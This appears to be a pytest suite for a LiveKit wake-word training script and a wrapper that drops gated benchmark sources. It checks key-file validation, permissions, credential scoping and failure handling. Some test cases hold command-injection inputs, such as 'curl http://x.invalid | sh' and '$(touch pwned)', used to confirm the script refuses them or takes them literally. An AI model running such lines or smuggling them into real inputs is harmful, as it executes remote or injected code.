"""tools/wake_train.sh and tools/wake_ungated.py against a fake trainer and a fake bench package.

The fake trainer is a small Python script standing in for `livekit-wakeword` (and for the trainer's
`python` with `--ungated`). It records each call (arguments, folder, the LiveKit variables it
could see) and behaves as a file in its control folder says: succeed, run out of speech credit,
fail. Everything lives under `tmp_path`; no real trainer, key or network is touched.
"""

import json
import os
import stat
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import pytest

TOOLS = Path(__file__).resolve().parent.parent / "tools"
SCRIPT = TOOLS / "wake_train.sh"
UNGATED = TOOLS / "wake_ungated.py"

URL = "wss://project-one.example.invalid"
KEY = "key-one"
SECRET = "secret-one"
QUOTA_LINE = "TTS credit quota exhausted (429, MaxGatewayCredits)"
CREDENTIALS = ("LIVEKIT_URL", "LIVEKIT_API_KEY", "LIVEKIT_API_SECRET")

_FAKE_TRAINER = """#!{python}
import json, os, re, sys
from pathlib import Path

control = Path({control!r})
args = sys.argv[1:]
ungated = bool(args) and args[0].endswith("wake_ungated.py")
if ungated:
    args = args[1:]
command = args[0]
calls = control / "calls"
calls.mkdir(exist_ok=True)
record = {{
    "command": command,
    "args": args,
    "ungated": ungated,
    "cwd": os.getcwd(),
    "credentials": {{n: os.environ.get(n) for n in {names!r}}},
}}
(calls / f"{{len(list(calls.iterdir())):02d}}-{{command}}.json").write_text(json.dumps(record))
mode_file = control / f"mode-{{command}}"
mode = mode_file.read_text().strip() if mode_file.exists() else "ok"
phrase = args[args.index("--wakeword") + 1]
slug = re.sub(r"[^\\w]+", "_", phrase.lower(), flags=re.UNICODE).strip("_") or "wakeword"
if command == "setup":
    if mode.startswith("quota"):
        print({quota!r}, file=sys.stderr)
        sys.exit(0 if mode == "quota-exit-zero" else 1)
    if mode == "fail":
        print("boom: setup", file=sys.stderr)
        sys.exit(1)
    print("datasets ready", file=sys.stderr)
elif command == "train":
    if mode == "fail":
        print("boom: train", file=sys.stderr)
        sys.exit(1)
    if mode != "no-model":
        Path(f"{{slug}}.onnx").write_bytes(b"fake model")
elif command == "eval":
    if mode == "fail":
        sys.stdout.write('{{"sco')
        print("boom: eval", file=sys.stderr)
        sys.exit(1)
    print(json.dumps({{"score": 0.9, "model": f"{{slug}}.onnx"}}))
"""


@dataclass
class Rig:
    """A fake trainer, a key file and a folder to run the script in, all under one root."""

    root: Path
    trainer: Path = field(init=False)
    control: Path = field(init=False)
    cwd: Path = field(init=False)

    def __post_init__(self) -> None:
        self.trainer = self.root / "trainer"
        self.control = self.root / "control"
        self.cwd = self.root / "cwd"
        for folder in (self.trainer / "bin", self.control, self.cwd):
            folder.mkdir(parents=True)
        body = _FAKE_TRAINER.format(
            python=sys.executable, control=str(self.control), names=CREDENTIALS, quota=QUOTA_LINE
        )
        for name in ("livekit-wakeword", "python"):
            fake = self.trainer / "bin" / name
            fake.write_text(body, encoding="utf-8")
            fake.chmod(0o755)

    def mode(self, command: str, mode: str) -> None:
        (self.control / f"mode-{command}").write_text(mode, encoding="utf-8")

    def key(
        self,
        name: str = "keys/project-one.env",
        *,
        url: str = URL,
        key: str = KEY,
        secret: str = SECRET,
        extra: str = "",
        perm: int = 0o600,
    ) -> str:
        """Write a key file under `cwd` and return its path relative to `cwd`."""
        path = self.cwd / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            f"# a LiveKit project\n\nLIVEKIT_URL={url}\nLIVEKIT_API_KEY={key}\n"
            f"LIVEKIT_API_SECRET={secret}\n{extra}",
            encoding="utf-8",
        )
        path.chmod(perm)
        return name

    def calls(self) -> list[dict[str, Any]]:
        folder = self.control / "calls"
        if not folder.exists():
            return []
        return [json.loads(p.read_text()) for p in sorted(folder.iterdir())]

    def commands(self) -> list[str]:
        return [call["command"] for call in self.calls()]

    def run(
        self,
        key: str,
        phrase: str = "jarvis",
        *flags: str,
        work: str = "work",
        env: dict[str, str] | None = None,
    ) -> subprocess.CompletedProcess[str]:
        environment = {k: v for k, v in os.environ.items() if k not in CREDENTIALS}
        environment.update({"TRAINER": str(self.trainer), "WORK": work, **(env or {})})
        return subprocess.run(
            ["bash", str(SCRIPT), key, phrase, *flags],
            cwd=self.cwd,
            env=environment,
            capture_output=True,
            text=True,
            check=False,
            timeout=60,
        )

    def eval_files(self, work: str = "work") -> list[Path]:
        return sorted((self.cwd / work).glob("eval-*"))


@pytest.fixture
def rig(tmp_path: Path) -> Rig:
    return Rig(tmp_path)


def output(done: subprocess.CompletedProcess[str]) -> str:
    return done.stdout + done.stderr


def test_a_relative_key_work_and_trainer_path_work_from_any_folder(rig: Rig) -> None:
    relative_trainer = os.path.relpath(rig.trainer, rig.cwd)

    done = rig.run(rig.key(), "jarvis", env={"TRAINER": relative_trainer})

    assert done.returncode == 0, output(done)
    assert rig.commands() == ["setup", "train", "eval"]
    assert {Path(call["cwd"]).resolve() for call in rig.calls()} == {(rig.cwd / "work").resolve()}
    scores = json.loads((rig.cwd / "work" / "eval-jarvis.json").read_text())
    assert scores["score"] == pytest.approx(0.9)
    assert (rig.cwd / "work" / "jarvis.onnx").exists()


def test_a_key_given_by_an_absolute_path_works_too(rig: Rig) -> None:
    rig.key()

    done = rig.run(str(rig.cwd / "keys/project-one.env"), work=str(rig.root / "elsewhere"))

    assert done.returncode == 0, output(done)
    assert (rig.root / "elsewhere" / "eval-jarvis.json").exists()


def test_a_credit_that_ran_out_stops_before_training_with_the_hint(rig: Rig) -> None:
    rig.mode("setup", "quota")

    done = rig.run(rig.key())

    assert done.returncode == 3, output(done)
    assert "use another project's key" in output(done)
    assert rig.commands() == ["setup"]
    assert rig.eval_files() == []


def test_a_credit_that_ran_out_stops_even_when_setup_exits_zero(rig: Rig) -> None:
    rig.mode("setup", "quota-exit-zero")

    done = rig.run(rig.key())

    assert done.returncode == 3, output(done)
    assert rig.commands() == ["setup"]


def test_a_retry_with_another_key_is_not_stopped_by_the_old_log(rig: Rig) -> None:
    rig.mode("setup", "quota")
    assert rig.run(rig.key("one.env")).returncode == 3
    rig.mode("setup", "ok")

    done = rig.run(rig.key("two.env", url="wss://two.example.invalid", key="key-two"))

    assert done.returncode == 0, output(done)
    assert rig.commands() == ["setup", "setup", "train", "eval"]
    assert rig.calls()[1]["credentials"]["LIVEKIT_API_KEY"] == "key-two"
    assert (rig.cwd / "work" / "eval-jarvis.json").exists()
    assert QUOTA_LINE in (rig.cwd / "work" / "train-jarvis.log").read_text()


def test_another_setup_failure_exits_one_with_a_clear_message_and_no_credit_hint(rig: Rig) -> None:
    rig.mode("setup", "fail")

    done = rig.run(rig.key())

    assert done.returncode == 1, output(done)
    assert "setup failed" in done.stderr
    assert "use another project's key" not in output(done)
    assert rig.commands() == ["setup"]


def test_a_failed_train_exits_one_with_a_clear_message(rig: Rig) -> None:
    rig.mode("train", "fail")

    done = rig.run(rig.key())

    assert done.returncode == 1, output(done)
    assert "train failed" in done.stderr
    assert rig.commands() == ["setup", "train"]


def test_a_failed_eval_leaves_no_json_behind(rig: Rig) -> None:
    rig.mode("eval", "fail")

    done = rig.run(rig.key())

    assert done.returncode == 1, output(done)
    assert "eval failed" in done.stderr
    assert rig.eval_files() == []
    assert not list((rig.cwd / "work").glob(".*eval*"))


def test_a_failed_eval_keeps_the_scores_of_an_earlier_good_run(rig: Rig) -> None:
    assert rig.run(rig.key()).returncode == 0
    before = (rig.cwd / "work" / "eval-jarvis.json").read_text()
    rig.mode("eval", "fail")

    assert rig.run(rig.key()).returncode == 1

    assert (rig.cwd / "work" / "eval-jarvis.json").read_text() == before


@pytest.mark.parametrize("perm", [0o644, 0o640, 0o604, 0o700])
def test_a_key_file_that_others_can_read_or_run_is_refused(rig: Rig, perm: int) -> None:
    done = rig.run(rig.key(perm=perm))

    assert done.returncode == 2, output(done)
    assert "chmod 600" in done.stderr
    assert rig.calls() == []


@pytest.mark.parametrize("perm", [0o600, 0o400])
def test_a_key_file_only_its_owner_can_use_is_accepted(rig: Rig, perm: int) -> None:
    done = rig.run(rig.key(perm=perm))

    assert done.returncode == 0, output(done)


@pytest.mark.parametrize(
    "extra",
    [
        "touch pwned\n",
        "export LIVEKIT_REGION=eu\n",
        "OTHER=1\n",
        "LIVEKIT_URL=wss://second.example.invalid; touch pwned\nxyz\n",
        "curl http://x.invalid | sh\n",
    ],
)
def test_a_key_file_with_anything_but_the_three_assignments_is_refused(
    rig: Rig, extra: str
) -> None:
    done = rig.run(rig.key(extra=extra))

    assert done.returncode == 2, output(done)
    assert "key file" in done.stderr
    assert rig.calls() == []
    assert not (rig.cwd / "pwned").exists()


def test_a_key_file_missing_a_value_is_refused(rig: Rig) -> None:
    done = rig.run(rig.key(secret=""))

    assert done.returncode == 2, output(done)
    assert "LIVEKIT_API_SECRET" in done.stderr
    assert rig.calls() == []


def test_a_missing_key_file_is_refused(rig: Rig) -> None:
    done = rig.run("keys/absent.env")

    assert done.returncode == 2, output(done)
    assert "absent.env" in done.stderr


def test_a_key_value_is_taken_literally_and_never_run(rig: Rig) -> None:
    done = rig.run(rig.key(secret="$(touch pwned)`touch pwned`"))

    assert done.returncode == 0, output(done)
    assert rig.calls()[0]["credentials"]["LIVEKIT_API_SECRET"] == "$(touch pwned)`touch pwned`"
    assert not (rig.cwd / "pwned").exists()


def test_a_quoted_value_loses_its_quotes(rig: Rig) -> None:
    done = rig.run(rig.key(key='"key-quoted"'))

    assert done.returncode == 0, output(done)
    assert rig.calls()[0]["credentials"]["LIVEKIT_API_KEY"] == "key-quoted"


def test_credentials_reach_setup_and_train_but_never_eval(rig: Rig) -> None:
    inherited = {name: f"inherited-{name}" for name in CREDENTIALS}

    done = rig.run(rig.key(), env=inherited)

    assert done.returncode == 0, output(done)
    by_command = {call["command"]: call["credentials"] for call in rig.calls()}
    expected = {"LIVEKIT_URL": URL, "LIVEKIT_API_KEY": KEY, "LIVEKIT_API_SECRET": SECRET}
    assert by_command["setup"] == expected
    assert by_command["train"] == expected
    assert by_command["eval"] == dict.fromkeys(CREDENTIALS)
    assert SECRET not in output(done)
    assert SECRET not in (rig.cwd / "work" / "train-jarvis.log").read_text()


def test_the_work_folder_and_log_are_private(rig: Rig) -> None:
    done = rig.run(rig.key())

    assert done.returncode == 0, output(done)
    work = rig.cwd / "work"
    assert stat.S_IMODE(work.stat().st_mode) == 0o700
    for path in work.iterdir():
        assert stat.S_IMODE(path.stat().st_mode) & 0o077 == 0, path


@pytest.mark.parametrize(
    ("phrase", "model"),
    [
        ("jarvis", "jarvis"),
        ("Hey Jarvis!", "hey_jarvis"),
        ("  hey   JARVIS  ", "hey_jarvis"),
        ("hey-jarvis, please", "hey_jarvis_please"),
        ("a__b", "a__b"),
        ("!!!", "wakeword"),
    ],
)
def test_the_model_is_named_the_way_the_trainer_names_it(rig: Rig, phrase: str, model: str) -> None:
    done = rig.run(rig.key(), phrase)

    assert done.returncode == 0, output(done)
    assert (rig.cwd / "work" / f"{model}.onnx").exists()
    assert (rig.cwd / "work" / f"eval-{model}.json").exists()
    assert f"{model}.onnx" in done.stdout


def test_training_that_writes_no_model_is_an_error_not_a_pass(rig: Rig) -> None:
    rig.mode("train", "no-model")

    done = rig.run(rig.key())

    assert done.returncode == 1, output(done)
    assert "jarvis.onnx" in done.stderr
    assert "eval" not in rig.commands()


def test_the_ungated_flag_runs_the_wrapper_with_the_trainer_python_and_marks_the_folder(
    rig: Rig,
) -> None:
    done = rig.run(rig.key(), "jarvis", "--ungated")

    assert done.returncode == 0, output(done)
    assert [call["ungated"] for call in rig.calls()] == [True, True, True]
    assert (rig.cwd / "work" / ".ungated").exists()


def test_a_full_run_in_a_folder_that_holds_an_ungated_test_set_is_refused(rig: Rig) -> None:
    assert rig.run(rig.key(), "jarvis", "--ungated").returncode == 0
    calls = len(rig.calls())

    done = rig.run(rig.key(), "jarvis")

    assert done.returncode == 2, output(done)
    assert "fresh WORK" in done.stderr
    assert len(rig.calls()) == calls


def test_an_ungated_run_may_repeat_and_a_full_run_in_a_fresh_folder_is_fine(rig: Rig) -> None:
    assert rig.run(rig.key(), "jarvis", "--ungated").returncode == 0
    assert rig.run(rig.key(), "jarvis", "--ungated").returncode == 0

    done = rig.run(rig.key(), "jarvis", work="fresh")

    assert done.returncode == 0, output(done)
    assert not (rig.cwd / "fresh" / ".ungated").exists()
    assert rig.calls()[-1]["ungated"] is False


@pytest.mark.parametrize(
    "arguments", [[], ["keys/a.env"], ["k", "p", "--other"], ["k", "p", "--ungated", "x"]]
)
def test_wrong_arguments_print_the_usage_and_exit_two(rig: Rig, arguments: list[str]) -> None:
    done = subprocess.run(
        ["bash", str(SCRIPT), *arguments],
        cwd=rig.cwd,
        capture_output=True,
        text=True,
        check=False,
        timeout=60,
    )

    assert done.returncode == 2
    assert "wake_train.sh KEY_FILE" in done.stderr
    assert rig.calls() == []


def test_a_missing_trainer_is_refused_before_anything_is_written(rig: Rig) -> None:
    done = rig.run(rig.key(), env={"TRAINER": str(rig.root / "no-trainer")})

    assert done.returncode == 2, output(done)
    assert "no-trainer" in done.stderr
    assert not (rig.cwd / "work").exists()


# --- tools/wake_ungated.py ---------------------------------------------------------------------

_FAKE_CLI = """import json, os, sys
from pathlib import Path
from livekit_wakeword_bench.sources import SOURCES

seen = {"argv": sys.argv[1:], "sources": sorted(SOURCES)}
Path(os.environ["FAKE_MARKER"]).write_text(json.dumps(seen))


def main():
    return None
"""


def _fake_bench(root: Path, *, version: str = "2.1.3", sources: tuple[str, ...]) -> Path:
    """A stand-in `livekit_wakeword_bench` and `livekit.wakeword._cli` on a path of their own."""
    site = root / "site"
    (site / "livekit" / "wakeword").mkdir(parents=True)
    (site / "livekit" / "__init__.py").write_text("")
    (site / "livekit" / "wakeword" / "__init__.py").write_text("")
    (site / "livekit" / "wakeword" / "_cli.py").write_text(_FAKE_CLI)
    package = site / "livekit_wakeword_bench"
    package.mkdir()
    (package / "__init__.py").write_text("")
    entries = ", ".join(f"{name!r}: object()" for name in sources)
    (package / "sources.py").write_text(f"SOURCES = {{{entries}}}\n")
    info = site / f"livekit_wakeword_bench-{version}.dist-info"
    info.mkdir()
    (info / "METADATA").write_text(
        f"Metadata-Version: 2.1\nName: livekit-wakeword-bench\nVersion: {version}\n"
    )
    return site


def _ungated(site: Path, *arguments: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, str(UNGATED), *arguments],
        env={
            **os.environ,
            "PYTHONPATH": str(site),
            "FAKE_MARKER": str(site.parent / "cli-ran.json"),
        },
        capture_output=True,
        text=True,
        check=False,
        timeout=60,
    )


def test_the_wrapper_drops_only_the_two_gated_sources_and_passes_the_arguments_on(
    tmp_path: Path,
) -> None:
    site = _fake_bench(tmp_path, sources=("esc50", "gtzan", "librispeech", "fsd"))

    done = _ungated(site, "setup", "--wakeword", "jarvis")

    assert done.returncode == 0, output(done)
    ran = json.loads((tmp_path / "cli-ran.json").read_text())
    assert ran == {"argv": ["setup", "--wakeword", "jarvis"], "sources": ["fsd", "librispeech"]}


@pytest.mark.parametrize("version", ["2.1.2", "2.1.4", "2.2.0", "3.0.0"])
def test_the_wrapper_refuses_a_bench_version_it_was_not_checked_against(
    tmp_path: Path, version: str
) -> None:
    site = _fake_bench(tmp_path, version=version, sources=("esc50", "gtzan", "fsd"))

    done = _ungated(site, "setup")

    assert done.returncode == 2, output(done)
    assert "2.1.3" in done.stderr
    assert version in done.stderr
    assert not (tmp_path / "cli-ran.json").exists()


@pytest.mark.parametrize("missing", ["esc50", "gtzan"])
def test_the_wrapper_refuses_when_a_gated_name_is_gone_from_the_sources(
    tmp_path: Path, missing: str
) -> None:
    site = _fake_bench(
        tmp_path, sources=tuple(n for n in ("esc50", "gtzan", "fsd") if n != missing)
    )

    done = _ungated(site, "setup")

    assert done.returncode == 2, output(done)
    assert missing in done.stderr
    assert not (tmp_path / "cli-ran.json").exists()


def test_the_wrapper_refuses_when_the_bench_is_not_installed(tmp_path: Path) -> None:
    site = _fake_bench(tmp_path, sources=("esc50", "gtzan"))
    for path in site.glob("livekit_wakeword_bench-*.dist-info/METADATA"):
        path.unlink()
        path.parent.rmdir()

    done = _ungated(site, "setup")

    assert done.returncode == 2, output(done)
    assert "livekit-wakeword-bench" in done.stderr


def test_the_docstring_claims_no_more_than_the_gated_sources_being_test_only() -> None:
    text = UNGATED.read_text(encoding="utf-8")

    assert "trained without them" in text
    assert "private" in text
    assert "is the same" not in text
